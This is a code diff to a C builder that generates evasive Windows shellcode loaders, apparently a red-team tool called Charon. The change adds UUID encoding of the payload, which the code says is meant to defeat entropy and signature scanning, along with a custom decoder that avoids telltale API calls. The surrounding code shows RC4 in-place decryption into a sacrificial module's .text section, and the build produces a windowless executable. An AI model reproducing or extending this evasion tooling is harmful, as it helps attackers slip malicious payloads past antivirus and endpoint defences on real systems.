@@ -22,6 +22,8 @@
  *         file on disk.
  *      5. Payload Protection: Uses RC4 encryption and 'KeyGuard' (runtime key
  *         calculation) to prevent static analysis of the payload.
+ *      6. UUID Encoding: Encodes the payload as a list of UUID strings to
+ *         disrupt entropy-based scanning and signature matching.
  *
  *  Author: vari.sh
  * ======================================================================================
@@ -306,6 +308,30 @@ const char *g_StubTemplate =
     "extern void SetTableAddr(PVOID pTable, PVOID pGadget, DWORD dwType, DWORD "
     "dwFrameSize);\n"
     "extern void Fnc0000(); // Reference to the base of the assembly stubs\n"
+    "\n"
+    // Decodes a UUID string (e.g., xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx")
+    // back into 16 raw bytes. This avoids using API calls like UuidFromStringA.
+    "void HexStringToBytes(const char* uuidStr, unsigned char* outBuf) {\n"
+    "    int byteIdx = 0;\n"
+    "    for (int i = 0; uuidStr[i] != '\\0'; i++) {\n"
+    "        if (uuidStr[i] == '-') continue; // Skip hyphens\n"
+    "\n"
+    "        char c = uuidStr[i];\n"
+    "        unsigned char val = 0;\n"
+    "\n"
+    "        // Convert Hex Char to Int\n"
+    "        if (c >= '0' && c <= '9') val = c - '0';\n"
+    "        else if (c >= 'A' && c <= 'F') val = c - 'A' + 10;\n"
+    "        else if (c >= 'a' && c <= 'f') val = c - 'a' + 10;\n"
+    "\n"
+    "        if (byteIdx % 2 == 0) {\n"
+    "            outBuf[byteIdx / 2] = val << 4; // High nibble\n"
+    "        } else {\n"
+    "            outBuf[byteIdx / 2] |= val;     // Low nibble\n"
+    "        }\n"
+    "        byteIdx++;\n"
+    "    }\n"
+    "}\n"
     "\n"
 
     // --- [SECTION 3] HELPERS ---\n"
@@ -598,7 +624,10 @@ const char *g_StubTemplate =
     // -------------------------------------------------------------------------
     "#define KEY_SIZE 16\n"
     "#define HINT_BYTE {{HINT_BYTE}}\n"
-    "unsigned char Payload[] = { {{PAYLOAD_BYTES}} };\n"
+    "#define UUID_COUNT {{UUID_COUNT}}\n"
+    "\n"
+    "const char* PayloadUUIDs[] = { {{PAYLOAD_UUIDS}} };\n"
+    "\n"
     "unsigned char Key[] = { {{KEY_BYTES}} };\n"
     "\n"
     "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* "
@@ -616,9 +645,10 @@ const char *g_StubTemplate =
     // -------------------------------------------------------------------------
     // Uncomment main and comment WinMain to enable console mode
     // "int main() {\n"
-    "   int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {\n"
+    "   int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR "
+    "lpCmdLine, int nCmdShow) {\n"
     // "    setvbuf(stdout, NULL, _IONBF, 0);\n"
-    "    PVOID pAddr = NULL; SIZE_T sSize = sizeof(Payload); DWORD dwOld = 0; "
+    "    PVOID pAddr = NULL; SIZE_T sSize = UUID_COUNT * 16; DWORD dwOld = 0; "
     "HANDLE hProc = (HANDLE)-1;\n"
     "    \n"
     "    printf(\"[+] Initializing Charon Engine...\\n\");\n"
@@ -663,7 +693,7 @@ const char *g_StubTemplate =
     "            pAddr = (PVOID)((PBYTE)hSacrificial + pSec[i].VirtualAddress "
     "+ "
     "4096);\n"
-    "            // Safety check: Ensure payload fits in the section\n"
+    // Safety check: Ensure payload fits in the section
     "            if (sSize + 4096 > pSec[i].Misc.VirtualSize) { printf(\"[!] "
     "Payload "
     "too big for .text\\n\"); return 1; }\n"
@@ -705,12 +735,15 @@ const char *g_StubTemplate =
     "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; \n"
     "    for(int i=0; i<KEY_SIZE; i++) Key[i] = (BYTE)((Key[i]^b)-i);\n"
     "    USTRING k = {KEY_SIZE, KEY_SIZE, Key}; USTRING d = {sSize, sSize, "
-    "Payload};\n"
+    "    pAddr};\n"
     "    fnSystemFunction032 Decrypt = "
     "(fnSystemFunction032)g_pSystemFunction032;\n"
     "    \n"
-    // Copy encrypted payload to target and decrypt in place
-    "    memcpy(pAddr, Payload, sizeof(Payload));\n"
+    // Decode UUIDs to pAddr
+    "    for (int i = 0; i < UUID_COUNT; i++) {\n"
+    "        HexStringToBytes(PayloadUUIDs[i], (unsigned char*)pAddr + (i * "
+    "16));\n"
+    "    }\n"
     "    d.Buffer = pAddr;\n"
     "    Decrypt(&d, &k);\n"
     "\n"
@@ -805,6 +838,32 @@ char *BytesToHexString(unsigned char *data, DWORD size) {
   return hexStr;
 }
 
+char *BytesToUUIDs(unsigned char *data, DWORD size) {
+  // Estimate size: Each 16 bytes = ~40 chars for UUID string (36 chars + quotes
+  // + comma + newline)
+  DWORD estimatedSize = (size / 16 + 1) * 60;
+  char *uuidBuf = (char *)malloc(estimatedSize);
+  if (!uuidBuf)
+    return NULL;
+
+  char *ptr = uuidBuf;
+  *ptr = '\0'; // Initialize string
+
+  for (DWORD i = 0; i < size; i += 16) {
+    unsigned char chunk[16] = {0};
+    DWORD bytesToCopy = (size - i) >= 16 ? 16 : (size - i);
+    memcpy(chunk, data + i, bytesToCopy);
+
+    ptr += sprintf(ptr,
+                   "\t\"%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%"
+                   "02X%02X%02X%02X\",\n",
+                   chunk[0], chunk[1], chunk[2], chunk[3], chunk[4], chunk[5],
+                   chunk[6], chunk[7], chunk[8], chunk[9], chunk[10], chunk[11],
+                   chunk[12], chunk[13], chunk[14], chunk[15]);
+  }
+  return uuidBuf;
+}
+
 char *ReplacePattern(const char *original, const char *pattern,
                      const char *replacement) {
   if (!original || !pattern || !replacement)
@@ -884,12 +943,14 @@ int main(int argc, char *argv[]) {
     protectedKey[i] = (unsigned char)((realKey[i] + i) ^ b);
   unsigned char hintByte = protectedKey[0] ^ b;
 
-  char *sPayload = BytesToHexString(shellcode, shellcodeSize);
+  char *sPayload = BytesToUUIDs(shellcode, shellcodeSize);
   char *sKey = BytesToHexString(protectedKey, 16);
   char sHint[10];
   sprintf(sHint, "0x%02X", hintByte);
 
-  // -----------------------------------------------------------------------
+  char sCount[16];
+  sprintf(sCount, "%lu", (shellcodeSize + 15) / 16);
+
   // -----------------------------------------------------------------------
   // [BUILD STEP 3] Generate Assembly Stubs (Polymorphic)
   // Create 'syscalls.asm' with the evasion engine and 512 unique entry stubs.
@@ -949,8 +1010,9 @@ int main(int argc, char *argv[]) {
   // -----------------------------------------------------------------------
   printf("[*] Generating artifact.c...\n");
   char *step1 = ReplacePattern(g_StubTemplate, "{{HINT_BYTE}}", sHint);
-  char *step2 = ReplacePattern(step1, "{{PAYLOAD_BYTES}}", sPayload);
-  char *finalSource = ReplacePattern(step2, "{{KEY_BYTES}}", sKey);
+  char *step2 = ReplacePattern(step1, "{{PAYLOAD_UUIDS}}", sPayload);
+  char *step3 = ReplacePattern(step2, "{{UUID_COUNT}}", sCount);
+  char *finalSource = ReplacePattern(step3, "{{KEY_BYTES}}", sKey);
 
   FILE *fC = fopen("artifact.c", "w");
   if (fC) {
@@ -967,8 +1029,9 @@ int main(int argc, char *argv[]) {
   // int res = system("cl /nologo /O2 artifact.c syscalls.obj "
   //                 "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO");
 
-  int res = system("cl /nologo /O2 artifact.c syscalls.obj "
-                  "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO /SUBSYSTEM:WINDOWS");
+  int res =
+      system("cl /nologo /O2 artifact.c syscalls.obj "
+             "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO /SUBSYSTEM:WINDOWS");
 
   // -----------------------------------------------------------------------
   // [BUILD STEP 7] Cleanup
@@ -977,6 +1040,7 @@ int main(int argc, char *argv[]) {
   system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");
   free(step1);
   free(step2);
+  free(step3);
   free(finalSource);
   free(sPayload);
   free(sKey);
